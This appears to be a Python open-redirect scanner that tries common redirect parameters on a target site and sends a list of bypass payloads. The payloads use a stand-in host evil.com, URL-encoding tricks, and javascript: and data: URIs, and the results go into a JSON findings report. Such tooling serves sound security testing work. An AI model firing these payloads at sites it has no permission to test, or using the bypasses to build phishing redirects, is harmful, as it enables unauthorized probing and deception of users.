#!/usr/bin/env python3
"""Agent for testing open redirect vulnerabilities.

Tests URL redirection parameters for open redirect flaws using
bypass techniques including URL encoding, protocol-relative URLs,
domain confusion, and parameter pollution.
"""

import json
import sys
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, quote

try:
    import requests
except ImportError:
    requests = None


REDIRECT_PARAMS = [
    "url", "redirect", "redirect_uri", "redirect_url", "next",
    "return", "returnTo", "return_to", "goto", "target", "dest",
    "destination", "rurl", "continue", "forward", "out", "view",
    "ref", "callback", "redir", "login_url", "logout",
]

BYPASS_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%2f%2f",
    "https://target.com@evil.com",
    "https://target.com.evil.com",
    "https://evil.com#target.com",
    "https://evil.com?.target.com",
    "https://evil.com/target.com",
    "https://evil%2Ecom",
    "//evil.com/%2f%2e%2e",
    "/%0d/evil.com",
    "https:evil.com",
    "javascript:alert(1)",
    "data:text/html,<h1>redirect</h1>",
]


class OpenRedirectTestAgent:
    """Tests for open redirect vulnerabilities."""

    def __init__(self, target_url, output_dir="./open_redirect_test"):
        self.target_url = target_url.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def _get(self, url, allow_redirects=False, timeout=10):
        if not requests:
            return None
        try:
            return requests.get(url, allow_redirects=allow_redirects, timeout=timeout)
        except requests.RequestException:
            return None

    def discover_redirect_params(self, paths=None):
        """Discover which URL parameters trigger redirects."""
        test_paths = paths or ["/login", "/logout", "/auth/callback", "/redirect", "/"]
        found = []
        for path in test_paths:
            for param in REDIRECT_PARAMS:
                test_url = f"{self.target_url}{path}?{param}=https://example.com"
                resp = self._get(test_url)
                if resp and resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("Location", "")
                    if "example.com" in location:
                        found.append({"path": path, "param": param, "location": location})
        return found

    def test_redirect_bypass(self, path, param):
        """Test a redirect parameter with bypass payloads."""
        results = []
        for payload in BYPASS_PAYLOADS:
            test_url = f"{self.target_url}{path}?{param}={quote(payload, safe='')}"
            resp = self._get(test_url)
            if not resp:
                continue

            location = resp.headers.get("Location", "")
            redirected = False
            if resp.status_code in (301, 302, 303, 307, 308):
                parsed = urlparse(location)
                if parsed.netloc and parsed.netloc != urlparse(self.target_url).netloc:
                    if "evil.com" in parsed.netloc or "evil" in location:
                        redirected = True

            if redirected:
                results.append({
                    "payload": payload,
                    "status": resp.status_code,
                    "location": location,
                    "bypassed": True,
                })
                self.findings.append({
                    "severity": "medium",
                    "type": "Open Redirect",
                    "detail": f"{path}?{param}={payload} redirects to {location}",
                })
        return results

    def test_all_endpoints(self, redirect_points=None):
        """Test all discovered redirect endpoints."""
        points = redirect_points or self.discover_redirect_params()
        all_results = []
        for point in points:
            results = self.test_redirect_bypass(point["path"], point["param"])
            all_results.extend(results)
        return all_results

    def test_javascript_redirect(self, path="/", param="url"):
        """Check for JavaScript-based redirects using meta refresh or JS."""
        test_url = f"{self.target_url}{path}?{param}=https://evil.com"
        resp = self._get(test_url, allow_redirects=True)
        if resp and "evil.com" in resp.text:
            js_patterns = ["window.location", "document.location", "meta http-equiv"]
            for pattern in js_patterns:
                if pattern in resp.text:
                    self.findings.append({
                        "severity": "medium",
                        "type": "JavaScript Redirect",
                        "detail": f"Client-side redirect via {pattern}",
                    })
                    return {"pattern": pattern, "found": True}
        return {"found": False}

    def generate_report(self):
        redirect_points = self.discover_redirect_params()
        bypass_results = self.test_all_endpoints(redirect_points)

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "target": self.target_url,
            "redirect_parameters_found": len(redirect_points),
            "redirect_points": redirect_points,
            "bypass_results": bypass_results,
            "findings": self.findings,
            "total_findings": len(self.findings),
        }
        out = self.output_dir / "open_redirect_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 2:
        print("Usage: agent.py <target_url>")
        sys.exit(1)
    agent = OpenRedirectTestAgent(sys.argv[1])
    agent.generate_report()


if __name__ == "__main__":
    main()
